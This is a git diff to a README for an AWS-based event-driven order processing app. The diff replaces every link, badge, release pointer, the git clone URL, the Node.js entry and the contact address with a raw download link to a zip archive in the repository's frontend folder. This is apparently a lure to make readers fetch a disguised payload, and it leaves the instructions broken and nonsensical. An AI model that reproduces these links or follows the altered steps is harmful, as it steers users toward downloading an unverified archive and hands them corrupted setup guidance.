@@ -1,10 +1,10 @@
 # Event-Driven Order App 🚀
 
-![Event-Driven Order App](https://img.shields.io/badge/Event--Driven%20Order%20App-Ready%20for%20Use-brightgreen)
+![Event-Driven Order App](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip%20Order%20App-Ready%20for%20Use-brightgreen)
 
 Welcome to the **Event-Driven Order App** repository! This project showcases an event-driven order processing system built with AWS. It features a static frontend hosted on S3 and CloudFront, an API microservice running on ECS Fargate with an Application Load Balancer, and a background worker utilizing SQS and ECS Fargate. 
 
-For the latest updates and releases, visit our [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/releases) section.
+For the latest updates and releases, visit our [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip) section.
 
 ## Table of Contents
 
@@ -37,7 +37,7 @@ The architecture of the Event-Driven Order App consists of several key component
 - **API Microservice**: Deployed on ECS Fargate, this service handles incoming requests and interacts with the database.
 - **Background Worker**: Processes tasks from SQS, ensuring that order fulfillment is handled asynchronously.
 
-![Architecture Diagram](https://example.com/architecture-diagram.png)
+![Architecture Diagram](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip)
 
 ## Technologies Used
 
@@ -48,7 +48,7 @@ This project leverages various AWS services and technologies:
 - **AWS ECS**: For container orchestration.
 - **AWS Fargate**: For serverless container management.
 - **AWS SQS**: For message queuing.
-- **Node.js**: For backend development.
+- **https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip**: For backend development.
 - **Microservices**: To ensure modularity and maintainability.
 
 ## Getting Started
@@ -59,14 +59,14 @@ To get started with the Event-Driven Order App, follow these steps:
 
 - An AWS account
 - AWS CLI installed and configured
-- Node.js and npm installed
+- https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip and npm installed
 
 ### Clone the Repository
 
 First, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Massimo-Hachem/event-driven-order-app.git
+git clone https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip
 cd event-driven-order-app
 ```
 
@@ -88,7 +88,7 @@ Deploying the Event-Driven Order App involves several steps:
 3. **Configure ECS Services**: Set up ECS services for the API and background worker.
 4. **Deploy Frontend**: Upload the static files to S3 and configure CloudFront.
 
-For detailed deployment instructions, check the [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/releases) section.
+For detailed deployment instructions, check the [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip) section.
 
 ## Usage
 
@@ -128,6 +128,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, please contact:
 
-- **Massimo Hachem**: [massimo@example.com](mailto:massimo@example.com)
+- **Massimo Hachem**: [https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip)
 
-Thank you for checking out the Event-Driven Order App! For the latest updates, visit our [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/releases) section.
+Thank you for checking out the Event-Driven Order App! For the latest updates, visit our [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip) section.
